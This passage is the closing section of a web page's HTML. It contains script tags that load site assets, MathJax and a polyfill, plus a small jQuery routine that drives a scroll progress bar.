integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?da39b660470d1ba6e6b8bf5f37070b6e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>